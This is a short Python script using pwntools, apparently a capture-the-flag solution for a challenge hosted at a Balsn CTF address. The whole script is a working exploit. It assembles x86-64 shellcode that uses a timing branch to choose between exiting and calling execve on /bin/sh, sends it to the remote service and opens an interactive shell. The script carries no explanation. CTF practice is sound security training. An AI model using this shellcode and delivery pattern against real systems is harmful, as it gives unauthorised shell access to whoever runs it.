from pwn import *

sc = '''
rdtsc
mov rdx, 0xfffff
.randomTimeWaste:
	dec rdx
	cmp rdx, 0
	jne .randomTimeWaste

and rax, 1
cmp rax, 1
je .parent
.child:
	mov rax, 60
	mov rdi, 0
	syscall
.parent:
	mov rax, 59
	lea rdi, [rip+binshStr]
	mov rsi, 0
	mov rdx, 0
	syscall

binshStr: .string "/bin/sh"
'''



if __name__ == "__main__":
	context.os = 'linux'
	context.arch = 'amd64'

	p = remote("securecheck.balsnctf.com", 54321)
	pay = asm(sc) 
	p.send(pay)
	p.interactive()
